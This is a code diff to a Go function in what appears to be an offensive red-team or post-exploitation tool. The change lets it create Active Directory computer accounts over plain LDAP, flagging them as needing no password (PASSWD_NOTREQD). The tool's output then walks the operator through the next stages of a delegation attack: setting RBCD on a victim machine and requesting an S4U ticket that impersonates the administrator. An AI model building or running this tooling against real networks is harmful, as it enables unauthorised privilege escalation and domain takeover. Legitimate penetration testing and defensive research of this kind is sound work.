@@ -636,9 +636,9 @@ func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 		}
 	}
 
-	if args.Value == "" {
+	if args.Value == "" && args.UseTLS {
 		return structs.CommandResult{
-			Output:    "Error: -value (password for the computer account) is required",
+			Output:    "Error: -value (password for the computer account) is required when using LDAPS",
 			Status:    "error",
 			Completed: true,
 		}
@@ -661,15 +661,19 @@ func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 		utf16Pwd[i*2+1] = 0
 	}
 
-	// WORKSTATION_TRUST_ACCOUNT = 0x1000 (4096)
-	const workstationTrustAccount = "4096"
-
 	addReq := ldap.NewAddRequest(computerDN, nil)
 	addReq.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user", "computer"})
 	addReq.Attribute("cn", []string{args.Target})
 	addReq.Attribute("sAMAccountName", []string{samName})
-	addReq.Attribute("userAccountControl", []string{workstationTrustAccount})
-	addReq.Attribute("unicodePwd", []string{string(utf16Pwd)})
+
+	if args.UseTLS {
+		// Over LDAPS: set password directly, use WORKSTATION_TRUST_ACCOUNT (0x1000)
+		addReq.Attribute("userAccountControl", []string{"4096"})
+		addReq.Attribute("unicodePwd", []string{string(utf16Pwd)})
+	} else {
+		// Over LDAP: can't set unicodePwd, use WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD (0x1020 = 4128)
+		addReq.Attribute("userAccountControl", []string{"4128"})
+	}
 
 	// Set DNS hostname if we can infer the domain
 	dnsParts := strings.Split(baseDN, ",")
@@ -693,16 +697,26 @@ func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 		}
 	}
 
+	pwdStatus := "(set)"
+	uacStr := "WORKSTATION_TRUST_ACCOUNT (0x1000)"
+	extraNote := ""
+	if !args.UseTLS {
+		pwdStatus = "(not set — use set-password over LDAPS to set)"
+		uacStr = "WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD (0x1020)"
+		extraNote = "\n[!] Password not set (requires LDAPS). For RBCD, this is fine — S4U uses the machine account hash.\n"
+	}
+
 	return structs.CommandResult{
 		Output: fmt.Sprintf("[*] LDAP Computer Account Creation (T1136.002)\n"+
 			"[+] DN:            %s\n"+
 			"[+] sAMAccountName: %s\n"+
-			"[+] Password:      (set)\n"+
-			"[+] UAC:           WORKSTATION_TRUST_ACCOUNT (0x1000)\n"+
+			"[+] Password:      %s\n"+
+			"[+] UAC:           %s\n"+
 			"[+] Server:        %s\n"+
+			"%s"+
 			"\n[!] Next: ldap-write -action set-rbcd -target <victim> -value %s\n"+
 			"[!] Then: ticket -action s4u -target <victim> -impersonate administrator\n",
-			computerDN, samName, args.Server, samName),
+			computerDN, samName, pwdStatus, uacStr, args.Server, extraNote, samName),
 		Status:    "success",
 		Completed: true,
 	}
